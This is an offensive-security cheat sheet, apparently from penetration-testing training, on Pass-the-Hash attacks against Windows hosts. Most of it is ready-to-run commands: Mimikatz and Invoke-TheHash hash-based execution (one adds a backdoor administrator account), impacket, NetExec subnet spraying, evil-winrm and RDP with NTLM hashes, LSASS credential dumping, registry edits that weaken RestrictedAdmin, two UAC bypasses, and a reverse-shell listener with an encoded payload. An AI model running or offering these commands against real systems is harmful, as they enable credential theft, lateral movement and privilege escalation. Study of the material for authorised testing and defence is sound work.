# Pass the Hash ([PtH](https://attack.mitre.org/techniques/T1550/002/))

## [Mimikatz](https://github.com/gentilkiwi) (Windows)

Mimikatz has a module named `sekurlsa::pth` that allows you to perform a Pass the Hash attack by starting a process using the hash of the user's password.

```cmd
# /rc4 or /NTLM - NTLM hash of the user's password
mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:64f12cddaa88057e06a81b54e73b949b /domain:example.com /run:cmd.exe" exit
```

---

## PowerShell [Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash) (Windows)

>Invoke-TheHash contains PowerShell functions for performing pass the  hash WMI and SMB tasks. WMI and SMB connections are accessed through the .NET TCPClient. Authentication is performed by passing an NTLM hash  into the NTLMv2 authentication protocol. Local administrator privilege  is not required client-side.

Local administrator privileges are not required client-side, but the  user and hash use to authenticate need to have administrative rights on the target computer.

### Invoke-TheHash with SMB

The following command will use the SMB method for command execution to  create a new user named mark and add the user to the Administrators  group:

```powershell
Import-Module .\Invoke-TheHash.psd1

# Can be used with the WMI as well
Invoke-SMBExec -Target 172.16.1.10 -Domain example.com -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "net user mark Password123 /add && net localgroup administrators mark /add" -Verbose
```

Can also be used to invoke a reverse shell on the target machine with `-Command`

- `.\nc.exe -lvnp 8001`
- [Reverse Shell Generator](https://www.revshells.com/) - PowerShell #3 (Base64)

### Invoke-TheHash with WMI

```powershell
Import-Module .\Invoke-TheHash.psd1

Invoke-WMIExec -Target DC01 -Domain example.com -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "powershell -e --Payload--"
```

---

## Linux

### Impacket PsExec

`````bash
impacket-psexec john@10.129.201.126 -hashes :c4b0e1b10c7ce2c4723b4e2407ef81a2
`````

- [impacket-wmiexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py)
- [impacket-atexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/atexec.py)
- [impacket-smbexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbexec.py)

### NetExec

`````bash
netexec smb 172.16.1.0/24 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453
`````

To perform the same actions but attempt to authenticate to each host in a subnet using the local administrator password hash, we could add `--local-auth` and|or `-x` to execute commands.

#### Command Execution

```bash
netexec smb 10.129.201.126 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453 -x whoami
```

### [Evil-WinRM](https://github.com/Hackplayers/evil-winrm)

If SMB is blocked or we don't have administrative rights, we can use this alternative protocol to connect to the target machine.

```bash
evil-winrm -i 10.129.204.23 -u john -H c4b0e1b10c7ce2c4723b4e2407ef81a2
```

### RDP

Perform an RDP PtH attack to gain GUI access using `xfreerdp`.

```bash
xfreerdp  /v:10.129.201.126 /u:julio /pth:64F12CDDAA88057E06A81B54E73B949B
```

If there is a restricted error ***exec*** in and run:

```cmd
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

### Extracting credentials with [Mimikatz](https://github.com/ParrotSec/mimikatz)

Dump credentials from memory using the `sekurlsa` module, or manually decrypt credentials using the `dpapi` module.

May need to bypass UAC if no admin rights, impersonation does not grant admin permissions.

```cmd
# Target the LSASS process with sekurlsa:
C:\Users\Administrator\Desktop> mimikatz.exe

mimikatz # privilege::debug
Privilege '20' OK

# Credential Manager
mimikatz # sekurlsa::credman

# Local passwords and hashes
mimikatz # sekurlsa::logonpasswords
```

Methods for getting passed UAC if no admin access:

```cmd
# fodhelper.exe
reg add HKCU\Software\Classes\ms-settings\shell\open\command /f /ve /t REG_SZ /d "cmd.exe" && start fodhelper.exe

# computerdefaults.exe
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ /d "" /f && reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /ve /t REG_SZ /d "cmd.exe" /f && start computerdefaults.exe
```

## Note

> UAC (User Account Control) limits local users' ability to perform remote administration operations. if `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy` is set to 0, it means that the built-in local admin account (RID-500,  "Administrator") is the only local account allowed to perform remote  administration tasks. Setting it to 1 allows the other local admins as  well.

> There is one exception, if the registry key `FilterAdministratorToken` (disabled by default) is enabled (value 1), the RID 500 account (even  if it is renamed) is enrolled in UAC protection. This means that remote  PTH will fail against the machine when using that account. 
